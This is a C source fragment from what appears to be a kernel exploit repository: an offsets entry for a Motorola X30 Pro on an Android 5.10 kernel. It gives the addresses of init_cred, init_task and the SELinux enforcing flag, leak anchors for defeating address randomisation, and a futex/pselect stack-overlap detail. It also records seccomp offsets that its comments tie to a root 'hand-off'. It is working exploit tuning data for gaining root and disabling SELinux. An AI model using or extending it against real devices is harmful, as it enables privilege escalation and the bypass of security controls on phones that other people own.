/* 5.10.233-android12-9-00062-g49c66df526b8-ab13101360
 *
 * Motorola X30 Pro (eqs, XT2241-1), Android 15, build V1SQ35H.96-13-1-3.
 * First android12-5.10 target in this repo: the waiter is the FLAT 5.10 layout
 * (STRUCT_OFFSETS_5_10 / compact_waiter = 2) and the image is mapped at a
 * different base than the 6.1+/6.6/6.12 GKI targets.
 *
 * All off_* values are (kallsyms address - 0xffffffc008000000) and were read out
 * of the device's own kallsyms dump (work/kallsyms_full.txt); the leak anchors
 * are the same ones proven by the standalone eqs exploit
 * (eqs_source/src/target.h, work/EQS_SLIDE_LEAK_DESIGN.md):
 *   _text                 0xffffffc008000000
 *   init_task             0xffffffc00a79be80
 *   init_cred             0xffffffc00a7b0a60
 *   root_task_group       0xffffffc00a993040
 *   selinux_state         0xffffffc00aa42b90   (enforcing is the byte at +0)
 *   nfulnl_logger         0xffffffc00a791338
 *   &loggers[11][1]       0xffffffc00a791318   (eqs needs k=11, see the leak doc)
 *   &random_table[4].data 0xffffffc00a8a7d28   (the boot_id ctl_table .data field)
 *
 * pselect_waiter_shift = 0 is frame-verified for eqs: futex_wait_requeue_pi
 * leaves rt_waiter at futex_wait_requeue_pi_sp+0x90 and pselect6 leaves
 * stack_fds at core_sys_select_sp+0x50, both == S0-0x210.
 *
 * kernel_phys_load: the ABL memory map reserves the 256MB "Kernel" region at PA
 * 0xA8000000 with text_offset=0, and memstart is 0x80000000, so delta is
 * 0x28000000. That happens to equal the target.h default
 * (P0_KERNEL_PHYS_LOAD 0xa8000000 - P0_PHYS_OFFSET 0x80000000); it is stated
 * explicitly here because getting it wrong puts every direct-map alias inside
 * the cdsp_secure_heap / hyp / PIL-reserved no-map carveouts.
 *
 * NOT YET VERIFIED for this target (left 0 on purpose, see STRUCT_OFFSETS_5_10):
 * task_pid, task_tgid, task_tasks, task_atomic_flags, task_seccomp. The KernelSU
 * hand-off needs a correct seccomp offset, so it must be measured before the
 * root hand-off is trusted (disassemble __secure_computing / seccomp_run_filters
 * from work/kernel_elf, or dump task+0x700..0x900 with the read primitive). */

OFFSETS_ENTRY(
    "5.10.233-android12-9-00062-g49c66df526b8-ab13101360",
    STRUCT_OFFSETS_5_10,
    .kernel_phys_load = 0xA8000000,
    .pselect_waiter_shift = 0,
    .off_init_task = 0x0279be80,
    .off_init_cred = 0x027b0a60,
    .off_root_task_group = 0x02993040,
    .off_selinux_enforcing = 0x02a42b90,
    .off_selinux_blob_sizes = 0x00000000,
    .off_security_hook_heads = 0x00000000,
    .off_slide_nfulnl_logger = 0x02791338,
    .off_slide_boot_id = 0x028a7d28,
    .off_slide_loggers_0_1 = 0x02791318,
    /* task_comm = 0x790 (__set_task_comm memcpy) and task_seccomp = 0x848
     * (__secure_computing `ldr w9,[current,#0x848]`; seccomp_run_filters reads
     * ->seccomp.filter at 0x850, so 0x84c is filter_count) are carried by
     * STRUCT_OFFSETS_5_10 in src/kernels/offsets.h. They are not repeated here
     * (that would trip -Winitializer-overrides). */
),
